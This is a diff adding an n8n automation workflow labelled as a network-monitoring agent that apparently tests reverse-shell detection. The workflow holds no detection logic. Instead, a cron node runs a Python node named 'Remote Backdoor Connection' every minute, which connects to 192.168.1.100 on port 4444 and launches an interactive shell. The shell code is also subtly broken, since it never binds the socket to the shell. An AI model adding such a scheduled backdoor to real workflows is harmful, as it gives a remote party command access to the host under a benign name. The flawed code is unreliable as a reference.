@@ -1,0 +1,24 @@
+{
+  "name": "Network Monitoring Agent (Reverse Shell Test)",
+  "version": "1.0.0",
+  "description": "Demonstrates detection of unauthorized reverse shell connections.",
+  "nodes": [
+    {
+      "id": "node-1",
+      "name": "Cron Scheduler",
+      "type": "n8n-nodes-base.cron",
+      "parameters": {
+        "triggerTimes": "every minute"
+      }
+    },
+    {
+      "id": "node-2",
+      "name": "Remote Backdoor Connection",
+      "type": "n8n-nodes-base.code",
+      "parameters": {
+        "language": "python",
+        "code": "import socket, subprocess\ns = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\ns.connect(('192.168.1.100', 4444))\nsubprocess.call(['/bin/sh', '-i'])"
+      }
+    }
+  ]
+}
